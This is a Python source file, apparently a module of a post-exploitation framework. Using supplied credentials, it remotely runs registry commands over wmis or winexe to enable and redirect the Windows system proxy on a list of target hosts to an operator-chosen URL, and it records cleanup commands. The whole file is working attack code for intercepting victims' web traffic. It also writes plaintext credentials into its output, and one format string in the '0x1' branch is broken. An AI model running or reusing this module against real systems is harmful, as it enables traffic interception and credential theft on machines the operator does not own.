"""

Enable/Changes the system proxy

Module built by @byt3bl33d3r

"""
import re
from lib import command_methods

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Enable Proxy"
        self.description = "Enables/Changes the system proxy on a host or host list"

        # targets, creds, args, invokemethod can be set on initialization or
        # manually by pillage doing module.targets = list(...) etc. 

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # holder for the argument dictionary passed by the main pillage.py
        # so we can parse command line arguments as necessary
        self.args = args

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        # a cleanup file that will be written out by pillage.py
        #   ex- if you're enabling the sticky-keys backdoor on systems
        self.cleanup = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = { "proxy_url"         : ["http://example.com:8080", "proxy url"],
                                  "trigger_method"    : ["wmis", "[wmis] or [winexe] for triggering"]}

        
    def run(self):

        # assume single set of credentials for this module
        username, password = self.creds[0]

        triggerMethod = self.required_options['trigger_method'][0]
        proxyUrl = self.required_options['proxy_url'][0]

        proxyCheckCmd =  "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable"

        proxyCheckServerCmd = "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer"

        proxyEnableCmd = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 1 /f"

        proxySetCmd = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer /t REG_SZ /d %s /f" % (proxyUrl)

        for target in self.targets:

            self.output += "[*] Checking proxy settings on %s" %(target)

            results = command_methods.executeResult(target, username, password, proxyCheckCmd, triggerMethod)

            if results == "":
                self.output += "\n[!] No result file, Proxy enable failed using creds '"+username+":"+password+"' on : " + target + "\n"
            elif "ProxyEnable" not in results:
                self.output += "\n[*] Proxy has never been set on " + target

                self.output += "\n[*] Enabling system proxy"

                enable_results = command_methods.executeResult(target, username, password, proxyEnableCmd, triggerMethod)

                if "The operation completed successfully" in enable_results:
                    self.output += "\n[*] Proxy successfully enabled on " + target

                    self.output += "\n[*] Setting proxy server"

                    set_results = command_methods.executeResult(target, username, password, proxySetCmd, triggerMethod)

                    if "The operation completed successfully" in set_results:
                        self.output += "\n[*] Proxy address successfully set to %s on %s" % (proxyUrl, target)

                        cleanupCMD = "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /f && reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer /f" 
                        self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+cleanupCMD+"|"+triggerMethod+"\n"

            elif "0x0" in results:
                server_results = command_methods.executeResult(target, username, password, proxyCheckServerCmd, triggerMethod)
                
                for res in server_results.split(" "):
                    r = re.findall(r".+:[0-9]{1,5}", res)
                    if r:
                        proxy = r[0]

                self.output += "\n[*] Proxy has been disabled but set to %s on %s" % (proxy, target)

                self.output += "\n[*] Enabling proxy"

                enable_results = command_methods.executeResult(target, username, password, proxyEnableCmd, triggerMethod)

                if "The operation completed successfully" in enable_results:
                    self.output += "\n[*] Proxy successfully enabled on " + target

                    self.output += "\n[*] Setting proxy server"

                    set_results = command_methods.executeResult(target, username, password, proxySetCmd, triggerMethod)

                    if "The operation completed successfully" in set_results:
                        self.output += "\n[*] Proxy address successfully set to %s on %s" % (proxyUrl, target)

                        cleanupCMD = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 0 /f && reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer /t REG_SZ /d %s /f" % proxy
                        self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+cleanupCMD+"|"+triggerMethod+"\n"
            

            elif "0x1" in results:
                server_results = command_methods.executeResult(target, username, password, proxyCheckServerCmd, triggerMethod)
                
                for res in server_results.split(" "):
                    r = re.findall(r".+:[0-9]{1,5}", res)
                    if r:
                        proxy = r[0]

                self.output += "\n[*] Proxy already enabled and set to %s on %s" % (proxy, target)

                self.output += "\n[*] Setting proxy server on " + target

                set_results = command_methods.executeResult(target, username, password, proxySetCmd, triggerMethod)

                if "The operation completed successfully" in set_results:
                    self.output += "\n[*] Proxy address successfully set to  on %s" % (proxyUrl, target)

                    cleanupCMD = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer /t REG_SZ /d %s /f" % proxy
                    self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+cleanupCMD+"|"+triggerMethod+"\n"

            else:
                self.output += "\n[!] Got unexpected output: %s" % results
                